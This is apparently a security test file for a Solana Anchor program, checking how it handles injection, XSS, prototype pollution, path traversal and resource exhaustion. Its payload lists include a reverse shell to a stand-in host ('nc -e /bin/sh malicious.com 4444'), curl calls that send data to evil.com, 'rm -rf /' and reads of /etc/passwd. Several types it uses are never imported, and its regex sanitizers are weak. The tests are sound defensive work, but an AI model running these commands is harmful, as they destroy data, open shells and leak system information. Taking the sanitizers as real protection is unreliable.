import * as anchor from "@coral-xyz/anchor";
import { Program, BN, AnchorProvider } from "@coral-xyz/anchor";
import { PodCom } from "../target/types/pod_com";
import { generateKeyPairSigner, type KeyPairSigner } from "@solana/signers";
import { address, getProgramDerivedAddress, type Address } from "@solana/addresses";
import { createSolanaRpc, type SolanaRpcApi } from "@solana/rpc";
import { lamports } from "@solana/rpc-types";
import { LAMPORTS_PER_SOL, SystemProgram } from "@solana/web3.js";
import { expect, test, beforeAll, describe } from "bun:test";
import { exec } from "child_process";
import { promisify } from "util";
import * as fs from "fs";
import * as path from "path";

const execAsync = promisify(exec);

// Configure the client to use the local cluster.
const provider = anchor.AnchorProvider.env();
anchor.setProvider(provider);

const program = anchor.workspace.PodCom as Program<PodCom>;
const wallet = (provider.wallet as anchor.Wallet).payer;

// Test utilities for security validation
const SecurityTestUtils = {
  // Generate malicious inputs for testing
  generateMaliciousInputs: () => ({
    // XSS payloads
    xssPayloads: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert(document.cookie)</script>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<style>@import"javascript:alert(\'XSS\')"</style>',
    ],
    
    // Command injection payloads
    commandInjection: [
      '; rm -rf /',
      '&& whoami',
      '| cat /etc/passwd',
      '$(curl malicious.com)',
      '`rm -rf /`',
      '; nc -e /bin/sh malicious.com 4444',
      '&& curl http://evil.com/$(whoami)',
      '|| echo "injected" > /tmp/test',
    ],
    
    // SQL injection payloads
    sqlInjection: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM sensitive_data --",
      "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
    ],
    
    // Buffer overflow attempts
    bufferOverflow: [
      'A'.repeat(10000),
      'A'.repeat(100000),
      '\x00'.repeat(1000),
      Buffer.alloc(65536, 'X').toString(),
    ],
    
    // Path traversal attempts
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    
    // JSON injection
    jsonInjection: [
      '{"__proto__": {"admin": true}}',
      '{"constructor": {"prototype": {"admin": true}}}',
      '{"__proto__": {"polluted": "yes"}}',
    ],
    
    // Unicode and encoding attacks
    unicodeAttacks: [
      '\u0000', // Null byte
      '\uFEFF', // BOM
      '\u202E', // Right-to-left override
      '\u200B', // Zero-width space
      '%00',
      '%2e%2e%2f',
    ],
  }),

  // Validate input sanitization
  validateSanitization: (input: string, sanitized: string): boolean => {
    const dangerousPatterns = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /data:text\/html/gi,
      /vbscript:/gi,
      /[;&|`$()]/gi,
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(sanitized));
  },

  // Test for memory leaks
  checkMemoryUsage: async (): Promise<number> => {
    const used = process.memoryUsage();
    return used.heapUsed / 1024 / 1024; // MB
  },

  // Generate invalid Solana addresses
  generateInvalidAddresses: () => [
    '', // Empty
    'invalid', // Too short
    '1'.repeat(100), // Too long
    'InvalidChars!@#$%^&*()', // Invalid characters
    '0000000000000000000000000000000000000000000', // Invalid format
  ],
};

describe("CRITICAL Security Vulnerability Tests", () => {
  let testKeypairs: Keypair[];
  let testPDAs: PublicKey[];
  
  beforeAll(async () => {
    // Generate test keypairs
    testKeypairs = Array.from({ length: 5 }, () => Keypair.generate());
    
    // Airdrop to test accounts
    for (const keypair of testKeypairs) {
      try {
        await provider.connection.requestAirdrop(
          keypair.publicKey,
          2 * LAMPORTS_PER_SOL
        );
      } catch (error) {
        console.warn(`Failed to airdrop to ${keypair.publicKey.toString()}`);
      }
    }
    
    // Wait for confirmations
    await new Promise(resolve => setTimeout(resolve, 3000));
  });

  // CRITICAL-01: Test panic vector prevention in Rust program
  describe("CRITICAL-01: Panic Vector Prevention", () => {
    test("should handle SecureBuffer creation failures gracefully", async () => {
      // This tests the fixed version - should not panic
      try {
        // Create a large buffer that might fail
        const largeSize = 2**31 - 1; // Max i32
        
        // The program should handle this gracefully now with proper error handling
        const [agentPDA] = PublicKey.findProgramAddressSync(
          [Buffer.from("agent"), testKeypairs[0].publicKey.toBuffer()],
          program.programId
        );

        await program.methods
          .registerAgent(new BN(1), "https://test.com")
          .accounts({
            agentAccount: agentPDA,
            signer: testKeypairs[0].publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([testKeypairs[0]])
          .rpc();
          
        // Should not panic or crash
        expect(true).toBe(true);
      } catch (error) {
        // Should get a proper error, not a panic
        expect(error.toString()).not.toContain("panic");
        expect(error.toString()).not.toContain("unwrap");
      }
    });

    test("should handle escrow account validation without panics", async () => {
      const [channelPDA] = PublicKey.findProgramAddressSync(
        [Buffer.from("channel"), testKeypairs[0].publicKey.toBuffer(), Buffer.from("test-channel")],
        program.programId
      );

      try {
        // Test escrow operations that previously could panic
        await program.methods
          .depositEscrow(new BN(1000))
          .accounts({
            escrowAccount: PublicKey.findProgramAddressSync(
              [Buffer.from("escrow"), channelPDA.toBuffer(), testKeypairs[0].publicKey.toBuffer()],
              program.programId
            )[0],
            channelAccount: channelPDA,
            depositor: testKeypairs[0].publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([testKeypairs[0]])
          .rpc();
      } catch (error) {
        // Should get proper error handling, not panic
        expect(error.toString()).not.toContain("unwrap");
        expect(error.toString()).not.toContain("panic");
      }
    });

    test("should handle hash function edge cases", async () => {
      // Test various message types that could cause hash function panics
      const maliciousInputs = [
        "", // Empty string
        "A".repeat(10000), // Very long string
        "\x00".repeat(1000), // Null bytes
        "🚀".repeat(1000), // Unicode
      ];

      for (const input of maliciousInputs) {
        try {
          const [channelPDA] = PublicKey.findProgramAddressSync(
            [Buffer.from("channel"), testKeypairs[0].publicKey.toBuffer(), Buffer.from("test")],
            program.programId
          );

          // This should handle malicious inputs gracefully
          await program.methods
            .broadcastMessage(input, { text: {} }, null, new BN(Date.now()))
            .accounts({
              channelAccount: channelPDA,
              participantAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("participant"), channelPDA.toBuffer(), testKeypairs[0].publicKey.toBuffer()],
                program.programId
              )[0],
              agentAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("agent"), testKeypairs[0].publicKey.toBuffer()],
                program.programId
              )[0],
              messageAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("channel_message"), channelPDA.toBuffer(), testKeypairs[0].publicKey.toBuffer(), new BN(Date.now()).toArrayLike(Buffer, "le", 8)],
                program.programId
              )[0],
              user: testKeypairs[0].publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypairs[0]])
            .rpc();
        } catch (error) {
          // Should handle gracefully with proper errors
          expect(error.toString()).not.toContain("panic");
        }
      }
    });
  });

  // CRITICAL-02: Command injection prevention tests
  describe("CRITICAL-02: Command Injection Prevention", () => {
    test("should sanitize CLI commands properly", async () => {
      const maliciousCommands = SecurityTestUtils.generateMaliciousInputs().commandInjection;
      
      // Test our sanitization function
      for (const cmd of maliciousCommands) {
        const testCommand = `bun test ${cmd}`;
        
        // This should be blocked by our sanitization
        const sanitized = sanitizeCommand(testCommand);
        expect(sanitized).toBeNull();
      }
    });

    test("should only allow whitelisted commands", async () => {
      const allowedCommands = [
        "bun install",
        "npm test",
        "anchor build",
        "solana --version",
      ];

      const blockedCommands = [
        "rm -rf /",
        "curl malicious.com | sh",
        "nc -e /bin/sh",
        "cat /etc/passwd",
      ];

      for (const cmd of allowedCommands) {
        const sanitized = sanitizeCommand(cmd);
        expect(sanitized).not.toBeNull();
      }

      for (const cmd of blockedCommands) {
        const sanitized = sanitizeCommand(cmd);
        expect(sanitized).toBeNull();
      }
    });

    test("should prevent shell metacharacter injection", async () => {
      const dangerousChars = [';', '&', '|', '`', '$', '(', ')', '[', ']', '{', '}', '\\'];
      
      for (const char of dangerousChars) {
        const maliciousCommand = `bun test${char}rm -rf /`;
        const sanitized = sanitizeCommand(maliciousCommand);
        expect(sanitized).toBeNull();
      }
    });
  });

  // CRITICAL-03: Unsafe memory operation tests
  describe("CRITICAL-03: Memory Safety Tests", () => {
    test("should handle memory allocation failures", async () => {
      // Test large allocations that might fail
      const largeAllocations = [
        2**20,  // 1MB
        2**25,  // 32MB
        2**30,  // 1GB (should fail gracefully)
      ];

      for (const size of largeAllocations) {
        try {
          // Test with compressed message operations that use memory
          const largeContent = 'A'.repeat(size > 10000 ? 10000 : size);
          
          await program.methods
            .broadcastMessageCompressed(
              largeContent,
              { text: {} },
              null,
              "QmTestHash12345"
            )
            .accounts({
              channelAccount: testPDAs[0],
              participantAccount: testPDAs[1],
              feePayer: testKeypairs[0].publicKey,
              authority: testKeypairs[0].publicKey,
              systemProgram: SystemProgram.programId,
              compressionProgram: SystemProgram.programId, // Mock for test
              registeredProgramId: SystemProgram.programId,
              noopProgram: SystemProgram.programId,
              accountCompressionAuthority: SystemProgram.programId,
              accountCompressionProgram: SystemProgram.programId,
              merkleTree: SystemProgram.programId,
              nullifierQueue: SystemProgram.programId,
              cpiAuthorityPda: SystemProgram.programId,
            })
            .signers([testKeypairs[0]])
            .rpc();
        } catch (error) {
          // Should handle gracefully, not crash
          expect(error.toString()).not.toContain("SIGSEGV");
          expect(error.toString()).not.toContain("memory");
        }
      }
    });

    test("should prevent buffer overflows", async () => {
      const overflowInputs = SecurityTestUtils.generateMaliciousInputs().bufferOverflow;
      
      for (const input of overflowInputs) {
        try {
          // Test with inputs that could cause buffer overflow
          await program.methods
            .registerAgent(new BN(1), input.substring(0, 200)) // Limit to reasonable size
            .accounts({
              agentAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("agent"), testKeypairs[1].publicKey.toBuffer()],
                program.programId
              )[0],
              signer: testKeypairs[1].publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypairs[1]])
            .rpc();
        } catch (error) {
          // Should handle gracefully with proper validation
          expect(error.toString()).not.toContain("overflow");
          expect(error.toString()).not.toContain("SIGSEGV");
        }
      }
    });
  });

  // CRITICAL-04: JSON parsing security tests
  describe("CRITICAL-04: JSON Parsing Security", () => {
    test("should prevent JSON injection attacks", async () => {
      const jsonPayloads = SecurityTestUtils.generateMaliciousInputs().jsonInjection;
      
      for (const payload of jsonPayloads) {
        try {
          // Test JSON parsing with malicious payloads
          const parsed = JSON.parse(payload);
          
          // Check that prototype pollution didn't occur
          expect({}.admin).toBeUndefined();
          expect({}.polluted).toBeUndefined();
          
          // Validate the parsed object is safe
          expect(validateJsonSafety(parsed)).toBe(true);
        } catch (error) {
          // Should reject malicious JSON gracefully
          expect(error).toBeInstanceOf(SyntaxError);
        }
      }
    });

    test("should validate JSON schema strictly", async () => {
      const invalidSchemas = [
        { __proto__: { admin: true } },
        { constructor: { prototype: { hacked: true } } },
        { toString: "malicious" },
        { valueOf: () => "exploit" },
      ];

      for (const schema of invalidSchemas) {
        const isValid = validateJsonSafety(schema);
        expect(isValid).toBe(false);
      }
    });
  });

  // CRITICAL-05: XSS prevention tests
  describe("CRITICAL-05: XSS Prevention", () => {
    test("should sanitize HTML input properly", async () => {
      const xssPayloads = SecurityTestUtils.generateMaliciousInputs().xssPayloads;
      
      for (const payload of xssPayloads) {
        const sanitized = sanitizeHtml(payload);
        
        // Verify all dangerous patterns are removed
        expect(SecurityTestUtils.validateSanitization(payload, sanitized)).toBe(true);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      }
    });

    test("should prevent DOM-based XSS", async () => {
      // Test various XSS vectors that could bypass basic sanitization
      const advancedXSS = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<style>@import"javascript:alert(1)"</style>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
      ];

      for (const xss of advancedXSS) {
        const sanitized = sanitizeHtml(xss);
        
        // Should remove all event handlers and javascript: URLs
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toMatch(/javascript:/i);
        expect(sanitized).not.toMatch(/@import/i);
      }
    });
  });

  // HIGH-RISK: Additional security tests
  describe("HIGH-RISK: Additional Security Validations", () => {
    test("should prevent integer overflow in rate limiting", async () => {
      // Test rate limiting with edge case values
      const edgeCases = [
        Number.MAX_SAFE_INTEGER,
        2**53 - 1,
        2**32 - 1,
        -1,
        0,
      ];

      for (const value of edgeCases) {
        try {
          // This should use checked arithmetic
          const result = await program.methods
            .broadcastMessage("test", { text: {} }, null, new BN(value))
            .accounts({
              channelAccount: testPDAs[0],
              participantAccount: testPDAs[1],
              agentAccount: testPDAs[2],
              messageAccount: testPDAs[3],
              user: testKeypairs[0].publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypairs[0]])
            .simulate();
          
          // Should handle gracefully
        } catch (error) {
          // Should get proper error, not overflow
          expect(error.toString()).not.toContain("overflow");
        }
      }
    });

    test("should validate wallet addresses properly", async () => {
      const invalidAddresses = SecurityTestUtils.generateInvalidAddresses();
      
      for (const addr of invalidAddresses) {
        const isValid = validateWalletAddress(addr);
        expect(isValid).toBe(false);
      }
    });

    test("should prevent path traversal attacks", async () => {
      const traversalAttempts = SecurityTestUtils.generateMaliciousInputs().pathTraversal;
      
      for (const path of traversalAttempts) {
        const sanitized = sanitizePath(path);
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('%2e%2e');
      }
    });
  });

  // Performance and DoS protection tests
  describe("DoS Protection Tests", () => {
    test("should handle resource exhaustion attempts", async () => {
      const initialMemory = await SecurityTestUtils.checkMemoryUsage();
      
      // Attempt to exhaust resources
      const promises = [];
      for (let i = 0; i < 100; i++) {
        promises.push(
          program.methods
            .registerAgent(new BN(i), `https://test${i}.com`)
            .accounts({
              agentAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("agent"), Keypair.generate().publicKey.toBuffer()],
                program.programId
              )[0],
              signer: testKeypairs[0].publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypairs[0]])
            .simulate()
            .catch(() => {}) // Ignore failures
        );
      }
      
      await Promise.allSettled(promises);
      
      const finalMemory = await SecurityTestUtils.checkMemoryUsage();
      const memoryIncrease = finalMemory - initialMemory;
      
      // Should not increase memory dramatically
      expect(memoryIncrease).toBeLessThan(100); // Less than 100MB increase
    });

    test("should implement proper rate limiting", async () => {
      const requests = [];
      const startTime = Date.now();
      
      // Make rapid requests
      for (let i = 0; i < 50; i++) {
        requests.push(
          program.methods
            .broadcastMessage(`message ${i}`, { text: {} }, null, new BN(i))
            .accounts({
              channelAccount: testPDAs[0],
              participantAccount: testPDAs[1],
              agentAccount: testPDAs[2],
              messageAccount: PublicKey.findProgramAddressSync(
                [Buffer.from("channel_message"), testPDAs[0].toBuffer(), testKeypairs[0].publicKey.toBuffer(), new BN(i).toArrayLike(Buffer, "le", 8)],
                program.programId
              )[0],
              user: testKeypairs[0].publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypairs[0]])
            .simulate()
            .catch(err => err)
        );
      }
      
      const results = await Promise.allSettled(requests);
      const failures = results.filter(r => r.status === 'rejected' || 
        (r.status === 'fulfilled' && r.value instanceof Error));
      
      // Should have some rate limit failures
      expect(failures.length).toBeGreaterThan(0);
    });
  });
});

// Helper functions for security validation
function sanitizeCommand(command: string): string | null {
  const allowedCommands = [
    /^bun\s+(?:install|run|build|test|dev)(?:\s+[\w\-\.]+)*$/,
    /^npm\s+(?:install|run|build|test|start)(?:\s+[\w\-\.]+)*$/,
    /^anchor\s+(?:build|deploy|test|--version)$/,
    /^solana\s+(?:--version|config)(?:\s+[\w\-\.]+)*$/,
  ];

  const isAllowed = allowedCommands.some(pattern => pattern.test(command));
  if (!isAllowed) return null;

  // Remove dangerous characters
  return command.replace(/[;&|`$()\[\]{}\\]/g, '').trim();
}

function sanitizeHtml(input: string): string {
  return input
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/on\w+\s*=/gi, '')
    .replace(/data:text\/html/gi, '')
    .replace(/@import/gi, '')
    .replace(/<iframe\b[^>]*>/gi, '')
    .replace(/<object\b[^>]*>/gi, '')
    .replace(/<embed\b[^>]*>/gi, '');
}

function validateJsonSafety(obj: any): boolean {
  if (obj === null || typeof obj !== 'object') return true;
  
  const dangerousKeys = ['__proto__', 'constructor', 'prototype', 'toString', 'valueOf'];
  
  for (const key of Object.keys(obj)) {
    if (dangerousKeys.includes(key)) return false;
    if (typeof obj[key] === 'object' && !validateJsonSafety(obj[key])) return false;
  }
  
  return true;
}

function validateWalletAddress(address: string): boolean {
  if (typeof address !== 'string') return false;
  if (address.length < 32 || address.length > 44) return false;
  
  const base58Regex = /^[1-9A-HJ-NP-Za-km-z]+$/;
  return base58Regex.test(address);
}

function sanitizePath(path: string): string {
  return path
    .replace(/\.\./g, '')
    .replace(/[\\\/]/g, '')
    .replace(/%2e%2e/gi, '')
    .replace(/%2f/gi, '')
    .replace(/%5c/gi, '');
} 